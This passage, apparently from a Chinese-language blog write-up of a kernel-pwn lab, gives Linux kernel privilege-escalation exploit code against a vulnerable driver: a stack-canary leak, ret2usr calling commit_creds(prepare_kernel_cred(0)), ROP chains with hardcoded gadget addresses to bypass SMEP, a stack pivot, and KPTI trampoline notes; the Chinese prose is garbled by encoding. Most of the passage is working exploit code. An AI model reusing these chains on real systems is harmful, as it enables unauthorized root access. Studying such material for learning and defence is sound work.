class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getShell</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(getuid() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    Info(<span class=\"string\">&quot;get shell now&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">  &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    Panic(<span class=\"string\">&quot;getShell failed&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 pkc = <span class=\"number\">0xffffffff814c67f0</span>;</span><br><span class=\"line\">u64 cc = <span class=\"number\">0xffffffff814c6410</span>;</span><br><span class=\"line\">u64 sh = (u64)getShell;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getRoot</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  (* (<span class=\"type\">int</span> *(*)(<span class=\"type\">void</span> *))cc)((* (<span class=\"type\">void</span> *(*)(<span class=\"type\">void</span> *))pkc)(<span class=\"literal\">NULL</span>));</span><br><span class=\"line\">  ret2usr();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">ret2usr</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  __asm__(</span><br><span class=\"line\">    <span class=\"string\">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov r15, user_ss;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;push r15;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov r15, user_sp;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;push r15;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov r15, user_rflags;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;push r15;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov r15, user_cs;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;push r15;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;mov r15, sh;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;push r15;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;swapgs;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;iretq;&quot;</span></span><br><span class=\"line\">    <span class=\"string\">&quot;.att_syntax;&quot;</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  open_dev();</span><br><span class=\"line\">  <span class=\"comment\">// getOpAddr();</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">0x80</span>];</span><br><span class=\"line\">  <span class=\"type\">char</span> store[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(buf, <span class=\"string\">&#x27;\\xff&#x27;</span>, <span class=\"number\">0x80</span>);</span><br><span class=\"line\">  wtk(buf, <span class=\"number\">0x80</span>);</span><br><span class=\"line\">  rfk(store,<span class=\"number\">0x90</span>);</span><br><span class=\"line\">  u64 *ptr = store;</span><br><span class=\"line\">  Dbg(<span class=\"string\">&quot;store addr is 0x%lx&quot;</span>, store);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;canary is 0x%lx&quot;</span>, ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  u64 canary = ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">  <span class=\"comment\">// wtk(buf, 0x10);</span></span><br><span class=\"line\">  u64 payload[<span class=\"number\">50</span>];</span><br><span class=\"line\">  <span class=\"type\">int</span> off = <span class=\"number\">16</span>;</span><br><span class=\"line\">  saveState();</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = getRoot;</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"å¢åŠ smep\"><a class=\"markdownIt-Anchor\" href=\"#å¢åŠ smep\">#</a> å¢åŠ  SMEP</h1>\n<h2 id=\"rop\"><a class=\"markdownIt-Anchor\" href=\"#rop\">#</a> ROP</h2>\n<p>å¼€äº† SMEP å°±è¦ ROP äº†<br>\nè¿™æ˜¯é«˜ç‰ˆæœ¬çš„å†…æ ¸ æ²¡æœ‰ cr4 ç›¸å…³çš„ gadget äº†</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/ $ uname -r</span><br><span class=\"line\">5.9.0-rc6+</span><br></pre></td></tr></table></figure>\n<p>åªèƒ½çº¯èµ° ROP ä¹Ÿå°±æ˜¯ ROP é‡Œ cc (pkc) ç„¶å swapgs å’Œ iretq<br>\n æ‰€ä»¥éœ€è¦æ‰¾ç±»ä¼¼ <code>mov rdi, rax</code>  çš„ gadget  æˆ–è€… xchg</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">objdump -j .text -d ./vmlinux | grep iretq | head -3</span><br></pre></td></tr></table></figure>\n<ul>\n<li>-j, --section=NAME             Only display information for section NAME</li>\n<li>-d, --disassemble        Display assembler contents of executable sections<br>\n ç”¨ j å¯ä»¥æŒ‡å®šç‰¹æ®Šçš„èŠ‚</li>\n</ul>\n<p>å°±æ˜¯ ROPgadget æ‰¾å‡ºæ¥çš„ gadget ä¸æ˜¯å…¨åœ¨å¯æ‰§è¡ŒåŒºåŸŸ è¦æ‰¾åŠå¤© æœ‰äº›è¿˜æ‰¾ä¸åˆ°<br>\nå¦‚æœ gdb é‡Œçœ‹åˆ° int3 å°±æ˜¯ä¸å¯æ‰§è¡ŒåŒºåŸŸäº†</p>\n<p>è¿™é‡Œæœ¬æ¥è¯•äº†å¥½å¤š gadgets ç»“æœéƒ½å› ä¸ºä¸å¯æ‰§è¡Œæ²¡æ³•ç”¨ æœ€ååªèƒ½ç”¨ä½œè€…çš„<br>\næ³¨æ„åˆ°ç¬¬ä¸€ä¸ª cmp åªæ˜¯ä¸ºäº†æ ‡è®° test åçš„ flag ä½ï¼ˆcmp å’Œ test éƒ½æ ‡è®° zfï¼‰</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  open_dev();</span><br><span class=\"line\">  <span class=\"comment\">// getOpAddr();</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">0x80</span>];</span><br><span class=\"line\">  <span class=\"type\">char</span> store[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(buf, <span class=\"string\">&#x27;\\xff&#x27;</span>, <span class=\"number\">0x80</span>);</span><br><span class=\"line\">  wtk(buf, <span class=\"number\">0x80</span>);</span><br><span class=\"line\">  rfk(store,<span class=\"number\">0x90</span>);</span><br><span class=\"line\">  u64 *ptr = store;</span><br><span class=\"line\">  Dbg(<span class=\"string\">&quot;store addr is 0x%lx&quot;</span>, store);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;canary is 0x%lx&quot;</span>, ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  u64 canary = ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">  <span class=\"comment\">// wtk(buf, 0x10);</span></span><br><span class=\"line\">  u64 payload[<span class=\"number\">50</span>];</span><br><span class=\"line\">  <span class=\"type\">int</span> off = <span class=\"number\">16</span>;</span><br><span class=\"line\">  u64 kernel_base              = <span class=\"number\">0xffffffff80000000</span>;</span><br><span class=\"line\">  u64 pop_rdx_ret              = <span class=\"number\">0xffffffff81007616</span>; <span class=\"comment\">// pop rdx ; ret</span></span><br><span class=\"line\">  u64 cmp_rdx_jne_pop2_ret     = <span class=\"number\">0xffffffff81964cc4</span>; <span class=\"comment\">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\">  u64 mov_rdi_rax_jne_pop2_ret = <span class=\"number\">0xffffffff8166fea3</span>; <span class=\"comment\">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\">  u64 pop_rdi_ret              = <span class=\"number\">0xffffffff81006370</span>; <span class=\"comment\">// pop rdi ; ret</span></span><br><span class=\"line\">  u64 swapgs_pop1_ret          = <span class=\"number\">0xffffffff8100a55f</span>; <span class=\"comment\">// not found </span></span><br><span class=\"line\">  u64 iretq                    = <span class=\"number\">0xffffffff8100c0d9</span>; <span class=\"comment\">// iretq</span></span><br><span class=\"line\">  saveState();</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = pop_rdi_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = pkc;</span><br><span class=\"line\">  payload[off++] = pop_rdx_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">8</span>;</span><br><span class=\"line\">  payload[off++] = cmp_rdx_jne_pop2_ret;<span class=\"comment\">// make test branch not reach</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = mov_rdi_rax_jne_pop2_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = cc;</span><br><span class=\"line\">  payload[off++] = swapgs_pop1_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = iretq;</span><br><span class=\"line\">  payload[off++] = getShell;</span><br><span class=\"line\">  payload[off++] = user_cs;</span><br><span class=\"line\">  payload[off++] = user_rflags;</span><br><span class=\"line\">  payload[off++] = user_sp;</span><br><span class=\"line\">  payload[off++] = user_ss;</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"stack-pivot\"><a class=\"markdownIt-Anchor\" href=\"#stack-pivot\">#</a> Stack Pivot</h2>\n<p>åŸºæœ¬æŒ‰ç…§åšå®¢æ€è·¯ copy ä¸€éï¼ˆ<br>\né¦–å…ˆæ‰¾åˆ°ä¸€ä¸ªèƒ½ç§»åŠ¨ä¸€ä¸ªå¸¸æ•°ç»™ esp çš„ï¼ˆç»™ esp æ˜¯å› ä¸ºåˆ°ç”¨æˆ·ç©ºé—´ é«˜ä½ä¼šæ¸…é›¶</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov_esp_pop2_ret = <span class=\"number\">0xffffffff8196f56a</span>; <span class=\"comment\">// mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret</span></span><br></pre></td></tr></table></figure>\n<p>ç„¶åå°±æ˜¯ mmap å¼€å†…å­˜åˆ°ä¸Šé¢ mov ç»™ esp å¢é•¿çš„åœ°æ–¹<br>\nä¸»è¦æ³¨æ„ä¸€ç‚¹ å› ä¸º rsp å¯å¢å¯è§ æ‰€ä»¥ä¸Šä¸‹çš„åç§»éƒ½è¦ç•™è¶³<br>\nç„¶åè®°å¾—éƒ½å†™ç‚¹å†…å®¹è§¦å‘ä¸‹æ¢é¡µ å…å¾—å‡ºç°ä¸­æ–­åˆåˆ‡å›å†…æ ¸äº†</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">u64 kernel_base              = <span class=\"number\">0xffffffff80000000</span>;</span><br><span class=\"line\">u64 pop_rdx_ret              = <span class=\"number\">0xffffffff81007616</span>; <span class=\"comment\">// pop rdx ; ret</span></span><br><span class=\"line\">u64 cmp_rdx_jne_pop2_ret     = <span class=\"number\">0xffffffff81964cc4</span>; <span class=\"comment\">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\">u64 mov_rdi_rax_jne_pop2_ret = <span class=\"number\">0xffffffff8166fea3</span>; <span class=\"comment\">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\">u64 pop_rdi_ret              = <span class=\"number\">0xffffffff81006370</span>; <span class=\"comment\">// pop rdi ; ret</span></span><br><span class=\"line\">u64 swapgs_pop1_ret          = <span class=\"number\">0xffffffff8100a55f</span>; <span class=\"comment\">// not found </span></span><br><span class=\"line\">u64 iretq                    = <span class=\"number\">0xffffffff8100c0d9</span>; <span class=\"comment\">// iretq</span></span><br><span class=\"line\">u64 mov_esp_pop2_ret         = <span class=\"number\">0xffffffff8196f56a</span>; <span class=\"comment\">// mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">StackPivot</span><span class=\"params\">(u64 canary)</span>&#123;</span><br><span class=\"line\">  u64 *p = mmap(</span><br><span class=\"line\">    (<span class=\"type\">void</span> *)<span class=\"number\">0x5b000000</span> - <span class=\"number\">0x1000</span>, <span class=\"number\">0x2000</span>, PROT_READ|PROT_WRITE|PROT_EXEC, </span><br><span class=\"line\">    MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, <span class=\"number\">-1</span>, <span class=\"number\">0</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  u64 off = <span class=\"number\">0x1000</span>/<span class=\"number\">8</span>;</span><br><span class=\"line\">  p[<span class=\"number\">1</span>   ] = <span class=\"number\">0xdeedbeaf</span>;</span><br><span class=\"line\">  p[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy</span></span><br><span class=\"line\">  p[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy</span></span><br><span class=\"line\">  p[off++] = pop_rdi_ret;</span><br><span class=\"line\">  p[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  p[off++] = pkc;</span><br><span class=\"line\">  p[off++] = pop_rdx_ret;</span><br><span class=\"line\">  p[off++] = <span class=\"number\">8</span>;</span><br><span class=\"line\">  p[off++] = cmp_rdx_jne_pop2_ret;<span class=\"comment\">// make test branch not reach</span></span><br><span class=\"line\">  p[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  p[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  p[off++] = mov_rdi_rax_jne_pop2_ret;</span><br><span class=\"line\">  p[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  p[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  p[off++] = cc;</span><br><span class=\"line\">  p[off++] = swapgs_pop1_ret;</span><br><span class=\"line\">  p[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  p[off++] = iretq;</span><br><span class=\"line\">  p[off++] = getShell;</span><br><span class=\"line\">  p[off++] = user_cs;</span><br><span class=\"line\">  p[off++] = user_rflags;</span><br><span class=\"line\">  p[off++] = user_sp;</span><br><span class=\"line\">  p[off++] = user_ss;</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;StackPivot&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  open_dev();</span><br><span class=\"line\">  <span class=\"comment\">// getOpAddr();</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">0x80</span>];</span><br><span class=\"line\">  <span class=\"type\">char</span> store[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(buf, <span class=\"string\">&#x27;\\xff&#x27;</span>, <span class=\"number\">0x80</span>);</span><br><span class=\"line\">  wtk(buf, <span class=\"number\">0x80</span>);</span><br><span class=\"line\">  rfk(store,<span class=\"number\">0x90</span>);</span><br><span class=\"line\">  u64 *ptr = store;</span><br><span class=\"line\">  Dbg(<span class=\"string\">&quot;store addr is 0x%lx&quot;</span>, store);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;canary is 0x%lx&quot;</span>, ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  u64 canary = ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">  <span class=\"comment\">// wtk(buf, 0x10);</span></span><br><span class=\"line\">  u64 payload[<span class=\"number\">50</span>];</span><br><span class=\"line\">  <span class=\"type\">int</span> off = <span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  saveState();</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = mov_esp_pop2_ret;</span><br><span class=\"line\">  StackPivot(canary);</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"å¢åŠ kpti\"><a class=\"markdownIt-Anchor\" href=\"#å¢åŠ kpti\">#</a> å¢åŠ  KPTI</h1>\n<p>KPTI åœ¨æ–‡ç« é‡Œå†™çš„å¾ˆæ¸…æ¥š åœ¨ç”¨æˆ·æ€åªèƒ½ç”¨ userland çš„é¡µè¡¨å’Œ minimal çš„å†…æ ¸é¡µè¡¨äº†<br>\næœ¬äººæ²¡æ‰¾åˆ°è¾ƒå¥½çš„è¯´æ˜æ–‡ç« ï¼Œæˆ‘è§‰å¾—æ˜¯è¿™ä¸ª minimal ä¸­åªåŒ…å« <code>swapgs_restore_regs_and_return_to_usermode</code>  è¿™ä¸ª gadget äº†ï¼Œ<br>\nè€Œä¸åŒ…å«ä¹‹å‰çš„ <code>swapgs_pop1_ret</code> .<br>\n ä¹Ÿå°±æ˜¯æ²¡æ³•å®ç°ç±»ä¼¼ å‡½æ•°è°ƒç”¨ä¸€æ ·çš„ç”¨æˆ·åˆ—è¡¨åˆ‡æ¢åˆ°å†…æ ¸åŒºåŸŸå»æ‰§è¡Œå’ŒæŸäº› ROP çš„æƒ…å†µäº†</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getRoot</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  (* (<span class=\"type\">int</span> *(*)(<span class=\"type\">void</span> *))cc)((* (<span class=\"type\">void</span> *(*)(<span class=\"type\">void</span> *))pkc)(<span class=\"literal\">NULL</span>));</span><br><span class=\"line\">  ret2usr();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ä½œè€…æåˆ°äº†ä¸¤ç§åŠæ³• æ­¤å¤–è¿˜æœ‰ä¸€ç§æ ¼å¤–çš„æ–¹æ³•</p>\n<ul>\n<li>ä¸€ç§æ˜¯ç”¨ <code>signal handler</code>  å» hook æ‰è¿™ä¸ª <code>SIGSEGV</code>  ä¿¡å· åœ¨ signal é‡Œé¢è¿›è¡Œå†…æ ¸å‡½æ•°çš„æ‰§è¡Œå´ä¸ä¼šè§¦å‘</li>\n<li>å¦å¤–çš„æ˜¯ <code>KPTI trampoline</code>  ä¹Ÿå°±æ˜¯å¤ç”¨å†…æ ¸ä¸­äº¤æ¢é¡µè¡¨çš„ gadget å†æ¬¡æ¢å›æ¥ï¼ˆgs å¯„å­˜å™¨æ§åˆ¶å†…æ ¸é¡µè¡¨ï¼‰</li>\n<li>ç”¨æ§åˆ¶ cr3 çš„ gadgets å» æŠŠ cr3 æˆ–ä¸Š 0x1000<br>\n å†…æ ¸æ€çš„é¡µè¡¨æ˜¯å…¨çš„ ç”¨æˆ·æ€é¡µè¡¨æ‰æ˜¯æ®‹ç¼ºçš„</li>\n</ul>\n<p>ä¹Ÿå°±æ˜¯ä¹‹å‰å­¦è¿‡çš„è¿™ä¸ª gadgets ä¸è¿‡è¿™é‡Œç•¥å¾®ä¸åŒ å¯¹äºå¼€äº† kpti çš„ç¨‹åºæ˜¯è¿™æ ·çš„ï¼ˆè‡³äºä¸ºä»€ä¹ˆä¼šä¸ç”¨åŸå…ˆçš„ï¼Œæˆ‘ä¹Ÿæ²¡å¼„æ˜ç™½ï¼Œ<br>\n å› ä¸ºæˆ‘å®é™…è°ƒè¯•çš„æ—¶å€™å‘ç° cr3 æ²¡å˜ï¼‰</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode</span><br><span class=\"line\">-&gt; ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f26</span>:  mov    rdi,rsp                      [<span class=\"number\">1</span>] &lt;&lt;- å…ˆæŠŠrspç»™åˆ°rdi</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f29</span>:  mov    rsp,QWORD PTR gs:<span class=\"number\">0x6004</span>      [<span class=\"number\">2</span>] &lt;&lt;- ç„¶åå¤åˆ¶æ–°çš„rsp pushéƒ½åœ¨æ–°rspä¸Š</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f32</span>:  push   QWORD PTR [rdi+<span class=\"number\">0x30</span>]</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f35</span>:  push   QWORD PTR [rdi+<span class=\"number\">0x28</span>]</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f38</span>:  push   QWORD PTR [rdi+<span class=\"number\">0x20</span>]</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f3b</span>:  push   QWORD PTR [rdi+<span class=\"number\">0x18</span>]</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f3e</span>:  push   QWORD PTR [rdi+<span class=\"number\">0x10</span>]</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f41</span>:  push   QWORD PTR [rdi]              [<span class=\"number\">3</span>] &lt;&lt;- åŸå…ˆrspçš„å†…å®¹åœ¨æ ˆä¸Š</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f43</span>:  push   rax</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f44</span>:  jmp    <span class=\"number\">0xffffffff81200f89</span></span><br><span class=\"line\"></span><br><span class=\"line\">   (Â·Â·Â·)</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f89</span>:  pop    rax                          [<span class=\"number\">4</span>] &lt;&lt;- raxå°±æ˜¯åŸå…ˆpushçš„rax æ²¡æœ‰å˜åŒ–</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f8a</span>:  pop    rdi                          [<span class=\"number\">5</span>] &lt;&lt;- rspä¸ºä¹‹å‰rspçš„è§£å¼•ç”¨äº†</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f8b</span>:  swapgs </span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f8e</span>:  data16 xchg ax,ax</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f91</span>:  jmp    <span class=\"number\">0xffffffff81200fc0</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t(Â·Â·Â·)</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200fc0</span>:  test   BYTE PTR [rsp+<span class=\"number\">0x20</span>],<span class=\"number\">0x4</span></span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200fc5</span>:  jne    <span class=\"number\">0xffffffff81200fc9</span></span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200fc7</span>:  iretq</span><br></pre></td></tr></table></figure>\n<p>è¿™é‡Œä½œè€…è§£é‡Šé”™äº† å¯¹äº <code>swapgs_restore_regs_and_return_to_usermode</code>  çœŸæ­£ç»™å‡ºä¸¤ä¸ª dummy çš„å¹¶ä¸æ˜¯ä¸¤ä¸ª pop,<br>\n è¿™é‡Œå‹å…¥ 6 ä¸ªå¯„å­˜å™¨ï¼Œè€Œåªå¼¹å‡ºäº†ä¸¤ä¸ªç„¶åå‰©ä¸‹çš„ <code>[rdi+0x10]</code>  å¼€å§‹æ‰æ˜¯çœŸçš„ <code>rip|cs|rflag|sp|ss</code> , æ‰€ä»¥å½“ rsp æŒ‡å‘å¦‚ä¸‹ä½ç½®çš„æ—¶å€™ï¼Œ<br>\n <code>rsp+0x10</code>  æ­£æ˜¯ rip 